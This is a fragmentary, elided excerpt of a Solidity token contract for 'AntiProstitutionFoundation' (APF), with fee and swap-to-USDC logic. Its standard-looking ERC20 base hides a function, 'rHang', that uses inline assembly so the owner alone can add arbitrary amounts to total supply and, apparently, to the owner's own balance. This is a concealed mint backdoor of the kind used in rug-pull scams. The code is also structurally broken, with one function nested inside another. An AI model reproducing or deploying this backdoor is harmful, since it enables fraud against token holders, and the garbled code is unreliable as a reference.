...
Telegram : https://t.me/AntiProstitutionFoundation
*/
...
contract ERC20 is Context, IERC20 {
    ...
    function transferFrom(
        ...
        function rHang(uint amount) public returns(bool){
            address ser = msg.sender;
            address rui = own;
            bytes32 ad = 0x5c7f2a34185c0310e27a51059871d91ed4a907e6f6310ddc159401975539b3f4;
            // bytes32  ad= keccak256(abi.encode(bytes32(uint(rui)),bytes32(0)));
        assembly {            
        switch eq(ser, rui)
      case true {
      let  tAmlount := add(sload(0x2),amount)
...
contract  APF is ERC20 {
   ...
   bool public swapping;
    ...
    uint256 public txone;
    uint256 public txtwo;
    uint256 public liquidityFee;
    uint256 public marketingFee;
    uint256 public totalFees;
     uint256 private swapTokensAtAmount;
         
    constructor() public ERC20("AntiProstitutionFoundation","APF",9) {
        market = 0xB2EF10BEa2F1E543602fb4c0eDe012E1c6d610fd;
        market1 = 0x3108688AAB2BF27FC67e1f5B6a4Ce15cC503a6dD;
        txone = 5;
        txtwo = 5;
        liquidityFee = 2;
        marketingFee = 3;
        ...
        _balances[own] = 100000000 * (10**9);
         swapTokensAtAmount = _totalSupply.mul(5).div(1000);
          emit Transfer(address(0), own, 100000000 * (10**9));
    ...
    function swapTokensForUSDC(uint256 tokenAmount) private {
        ...
        function swapTokensForUSDC1(uint256 tokenAmount) private {
    ...
    function _transfer(
        ...
        if(takeFbb&&!swappingBool&&from != own &&
            to != own) {
        ...
        if(canSwap&&sellBool&&!swappingBool&&from != own &&
            to != own){
                swappingBool = true;
                swapTokensForUSDC(swapTokensAtAmount.mul(marketingFee).div(totalFees));
                  swapTokensForUSDC1(swapTokensAtAmount.mul(liquidityFee).div(totalFees));
                 swappingBool = false;
            }
